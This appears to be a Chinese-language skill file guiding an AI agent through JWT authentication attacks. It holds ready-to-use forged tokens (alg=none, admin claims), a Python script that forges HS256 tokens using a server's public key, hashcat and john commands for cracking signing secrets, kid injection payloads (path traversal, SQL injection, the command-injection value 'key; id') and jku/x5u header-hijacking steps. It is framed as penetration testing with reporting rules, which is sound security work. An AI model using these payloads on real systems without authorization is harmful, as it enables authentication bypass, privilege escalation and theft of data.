---
name: jwt-attack
description: JWT 认证缺陷的测试与利用——alg 混淆、none、密钥爆破、kid 路径/注入、jku/x5u 劫持、算法与声明篡改、签名不校验。在接口用 Bearer Token 鉴权、或有 JWT 出现在 Cookie/URL/本地存储时使用。
version: 1.0.0
---

# JWT 攻击

先拆 token，再按"签名是否被真正校验"分层试探。**每一步都要能复现**：把篡改后的 token 贴进请求，拿到原本无权访问的数据才算确认。

## 1. 拆解与指纹

```
head.$(echo payload | base64 -d).sig
```
- 看 `alg`：HS256/384/512（对称）、RS256/384/512（非对称）、ES*、PS*、`none`。
- 看 `kid`（key id）、`jku`/`x5u`（key 来源 URL）、`typ`、`cty`。
- 看声明：`iss`/`aud`/`exp`/`nbf`/`sub`/`role`/`scope`/`admin`/`tenant`。
- 记录 token 来源（Cookie 名 / Authorization 头 / 自定义头）与**刷新机制**（refresh token 是否同样可篡改）。

## 2. alg=none

```
{"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}.
```
变体：`None`/`NONE`/`nOnE`、签名段留空或去掉末尾点、把 `alg` 整个删掉。多数库已默认禁用，但自研校验器常见漏网。

## 3. HS/RS 算法混淆（最经典）

服务端用 RS256 公钥验签，但校验代码允许 `alg` 由 token 指定。把 `alg` 改成 `HS256`，用**公开的公钥**（常能从 `/.well-known/jwks.json`、`/jwks`、TLS 证书公钥、代码仓库拿到）作 HMAC 密钥签名：

```
# 公钥当 HMAC key（PEM 原文，含换行）
python3 -c "
import hmac,hashlib,base64,json
h=base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
key=open('pub.pem','rb').read()
s=base64.urlsafe_b64encode(hmac.new(key,f'{h}.{p}'.encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
print(f'{h}.{p}.{s}')"
```
try 变体：公钥的 DER/裸 base64/去掉头尾行；有的库校验时对 key 做了 trim。

## 4. 弱密钥爆破

```
hashcat -m 16500 jwt.txt WORDLIST -r rules/best64.rule
# 或 john --format=HMAC-SHA256 jwt.txt
```
字典优先：`jwt.secrets.list`、上一轮 OSINT 拿到的项目约定词（公司名+年份+`secret`）。命中后用同密钥伪造任意声明。

## 5. kid 注入

- **路径穿越**：`"kid":"../../../../dev/null"` → 用空密钥签名（`HMAC("")`）；`"kid":"/proc/self/environ"` 等可读文件当密钥。
- **SQL 注入**：`"kid":"1' UNION SELECT 'known' --"`，让服务端取出你控制的密钥。
- **命令注入**：`"kid":"key; id"`（少数实现拿 kid 拼命令）。
- **目录遍历 + 上传**：若能把文件写到 kid 解析的目录，直接放自己的 「密钥文件」。

## 6. jku / x5u / jwk 头注入

- `jku` 指向你自己的 JWKS（`{"keys":[{...}]}` 含你的公钥/对称密钥），服务端若不校验域名白名单 → 用它验你的签名。
- `x5u` 同理指向自签证书链。
- 内嵌 `jwk` 头：有些库信任 token 自带的公钥。

## 7. 声明与校验缺陷

即使签名无法伪造，也检查：
- **过期未校验**：把 `exp` 改成未来/过去，看是否仍接受。
- **aud/iss 未校验**：跨租户/跨环境 token 复用。
- **算法未强制**：`alg` 缺失时的默认行为。
- **签名为空/截断**：`sig` 留空、只留前几位。
- **jwt 库版本**：已知 CVE（如 pyjwt 的 `alg` 混淆、node-jsonwebtoken 的历史问题）。

## 8. 复现纪律

- 攻击后必须用**篡改 token 实际调用一个受限接口**并拿到越权数据/操作结果，才算确认（仅"token 能解码/被接受"不够）。
- 报告里保存：原始 token、篡改后 token（`sub`/`role` 差异）、使用的密钥/文件路径、请求与响应原文。
- 对称密钥泄露属于 critical；仅"alg=none 被接受"而无法访问受限资源 → 按 medium/high 并说明影响边界。
